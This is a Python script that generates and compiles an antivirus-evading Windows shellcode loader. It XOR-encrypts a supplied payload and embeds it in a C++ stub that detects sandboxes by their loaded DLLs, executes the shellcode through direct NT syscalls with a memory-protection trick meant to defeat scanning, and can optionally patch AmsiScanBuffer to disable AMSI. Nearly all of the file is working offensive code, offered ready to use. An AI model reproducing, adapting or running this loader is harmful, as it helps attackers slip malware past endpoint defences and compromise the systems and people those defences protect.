#!/usr/bin/python3
#Created by Matthew David (@icyguider)
import sys, os, argparse, random, string

inspiration = """
┳┻|
┻┳|
┳┻|
┻┳|
┳┻| _
┻┳| •.•)  - Shhhhh, AV might hear us! 
┳┻|⊂ﾉ   
┻┳|
"""

stub = """
#include <iostream>
#include <windows.h>
#include "Syscalls.h"
#include <psapi.h>
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

REPLACE_ME_PAYLOAD

unsigned int payload_len = sizeof(payload) / sizeof(payload[0]);

unsigned char* decoded = (unsigned char*)malloc(payload_len);

int PrintModules(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

    // Print the process identifier.
    //printf("\\nProcess ID: %u\\n", processID);

    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL == hProcess)
        return 1;

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                sizeof(szModName) / sizeof(TCHAR)))
            {
                //std::string target = L"Dbghelp.dll";
                String dang = szModName;

                //CHECK TO SEE IF THESE DLLS ARE LOADED. IF NOT, THEN RETURN 2 TO CONTINUE FOR LOOP
                if (dang.find(L"SbieDll.dll") != std::string::npos || dang.find(L"Api_log.dll") != std::string::npos || dang.find(L"Dir_watch.dll") != std::string::npos || dang.find(L"dbghelp.dll") != std::string::npos)
                {
                    // Print the module name and handle value.
                    //_tprintf(TEXT("\\t%s (0x%08X)\\n"), szModName, hMods[i]);
                    return 2;
                }
                
            }
        }
    }

    // Release the handle to the process.
    CloseHandle(hProcess);
    return 0;
}

int getLoadedDlls()
{
    DWORD aProcesses[1024];
    DWORD cbNeeded;
    DWORD cProcesses;
    unsigned int i;

    // Get the list of process identifiers.
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return 1;

    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the names of the modules for each process.
    int result;
    int done = 0;
    DWORD saved;
    //Loop for dlls. Loop will continue until dlls are found to bypass sandboxing.
    while (done != 2)
    {
        for (i = 0; i < cProcesses; i++)
        {
            result = PrintModules(aProcesses[i]);
            if (result == 2)
            {
                done = result;
                saved = aProcesses[i];
            }
        }
    }
    return 0;
}


int deC(unsigned char payload[])
{
    std::string key;
    key = "REPLACE_ME_KEY";
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key.length(); z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

int main()
{
    HANDLE hProc = GetCurrentProcess();
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;

    getLoadedDlls();
    AMSI_BYPASS
    deC(payload);

    // Allocate memory in the current proccess
    NTSTATUS NTAVM = NtAllocateVirtualMemory(hProc, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, 0x40);
    // Write the decrypted shellcode to the allocated memory
    NTSTATUS NTWVM = NtWriteVirtualMemory(hProc, base_addr, decoded, payload_len, &bytesWritten);
    // Set permission on allocated memory as PAGE_NOACCESS
    NTSTATUS NTPVM = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_NOACCESS, &oldprotect);
    // Create thread in suspended state
    NTSTATUS ct = NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, TRUE, 0, 0, 0, NULL);
    // Sleep for 3 seconds for AV to scan suspened thread... Idk if this actually does anything so may remove it in new updates.
    Sleep(3000);
    // Set permission on allocated memory as PAGE_EXECUTE_READ
    NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
    // Resuming Thread
    NtResumeThread(thandle, 0);
    NtWaitForSingleObject(thandle, -1, NULL);
    // Free allocated memory
    NtFreeVirtualMemory(hProc, base_addr, 0, MEM_RELEASE | MEM_DECOMMIT);
    NtFreeVirtualMemory(hProc, &decoded, 0, MEM_RELEASE | MEM_DECOMMIT);
}"""

amsi_bypass = """
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    try {
        DWORD oldProtect, newProtect;
        SIZE_T numBytes;
        int patch_len = 6;
        HMODULE hmodule = LoadLibrary(TEXT("amsi.dll"));
        if (hmodule == NULL)
        {
            std::cout << "[+] Failed to load amsi.dll" << std::endl;
            exit(EXIT_FAILURE);
        }
        PVOID addr = GetProcAddress(hmodule, "AmsiScanBuffer");
        PVOID oldaddr = addr;
        if (addr == NULL)
        {
            std::cout << "[+] Failed to get the address of AmsiScanBuffer" << std::endl;
            exit(EXIT_FAILURE);
        }
        // I tried doing this with NtProtectVirtualMemory, but the patch didn't seem to be effective :(
        VirtualProtect(addr, patch_len, 0x40, &oldProtect);
        NtWriteVirtualMemory(hProc, addr, patch, patch_len, &numBytes);
        VirtualProtect(addr, patch_len, oldProtect, newProtect);
        std::cout << "[+] Successfully Patched AMSI" << std::endl;
    }
    catch (...) {
        std::cout << "[+] Patching AMSI Failed!" << std::endl;
    }
"""

def generateKey():
    letters = string.ascii_letters + string.digits
    key = ''.join(random.choice(letters) for i in range(49))
    return key

def main(stub, infile, outfile, key, amsi):
    print("[+] ICYGUIDER'S CUSTOM SYSWHISPERS SHELLCODE LOADER")
    file = open(infile, 'rb')
    contents = file.read()
    file.close()

    encrypted = []
    for b in range(len(contents)):
        test = contents[b]
        for i in range(len(key)):
            test ^= ord(key[i])
        encrypted.append("{:02x}".format(test))

    output = "unsigned char payload[] = {"

    count = 0
    for x in encrypted:
        if count < len(encrypted)-1:
            output += "0x{},".format(x)
        else:
            output += "0x{}".format(x)
        count += 1

    output += "};"

    stub = stub.replace("REPLACE_ME_PAYLOAD", output)
    stub = stub.replace("REPLACE_ME_KEY", key)
    if amsi is True:
        print("[+] Adding AMSI bypass to stub")
        stub = stub.replace("AMSI_BYPASS", amsi_bypass)
    else:
        stub = stub.replace("AMSI_BYPASS", "")

    file = open("stub.cpp", "w")
    file.write(stub)
    file.close()
    print("[+] Saved new stub to stub.cpp")
    print("[+] Compiling new stub...")
    os.system("x86_64-w64-mingw32-g++ stub.cpp -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -o {}".format(outfile))
    if os.path.exists(outfile) == True:
        print("[!] {} has been compilied successfully!".format(outfile))
    else:
        print("[!] Stub compilation failed! Something went wrong!")
    os.system("rm stub.cpp")


print(inspiration[1:-1])
parser = argparse.ArgumentParser(description='ICYGUIDER\'S CUSTOM SYSWHISPERS SHELLCODE LOADER')
parser.add_argument("file", help="File containing raw shellcode", type=str)
parser.add_argument('-a', '--amsi', action='store_true', help='Enable AMSI Bypass (Uses VirtualProtect, be careful!)')
parser.add_argument('-o', '--outfile', dest='out', help='Name of compiled file', metavar='a.exe', default='a.exe')
if len(sys.argv) < 2:
    parser.print_help()
    sys.exit()
args = parser.parse_args()
try:
    if os.path.exists(args.out) == True:
        os.system("rm {}".format(args.out))
    key = generateKey()
    main(stub, args.file, args.out, key, args.amsi)
except:
    sys.exit()
